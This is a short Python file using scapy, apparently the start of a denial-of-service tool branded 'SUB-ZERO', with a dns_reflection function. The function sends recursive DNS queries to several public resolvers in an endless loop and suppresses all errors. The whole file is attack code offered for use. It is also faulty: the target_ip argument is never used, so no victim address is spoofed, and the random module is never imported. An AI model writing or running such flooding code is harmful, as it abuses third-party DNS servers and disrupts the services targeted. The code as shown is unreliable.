import scapy.all as scapy
'''
        ███████╗██╗   ██╗██████╗      ███████╗███████╗██████╗  ██████╗     
        ██╔════╝██║   ██║██╔══██╗     ╚══███╔╝██╔════╝██╔══██╗██╔═══██╗    
        ███████╗██║   ██║██████╔╝█████╗ ███╔╝ █████╗  ██████╔╝██║   ██║    
        ╚════██║██║   ██║██╔══██╗╚════╝███╔╝  ██╔══╝  ██╔══██╗██║   ██║    
        ███████║╚██████╔╝██████╔╝     ███████╗███████╗██║  ██║╚██████╔╝    
        ╚══════╝ ╚═════╝ ╚═════╝      ╚══════╝╚══════╝╚═╝  ╚═╝ ╚═════╝     
                                                                                                                                                                  
'''

def dns_reflection(target_ip):
    dns_servers = ["8.8.8.8", "1.1.1.1", "9.9.9.9", "208.67.222.222"]
    while True:
        try:
            query = scapy.DNSQR(qname="example.com")
            packet = scapy.IP(dst=random.choice(dns_servers)) / scapy.UDP(sport=random.randint(1024, 65535), dport=53) / scapy.DNS(rd=1, qd=query)
            scapy.send(packet, verbose=False)
        except:
            pass
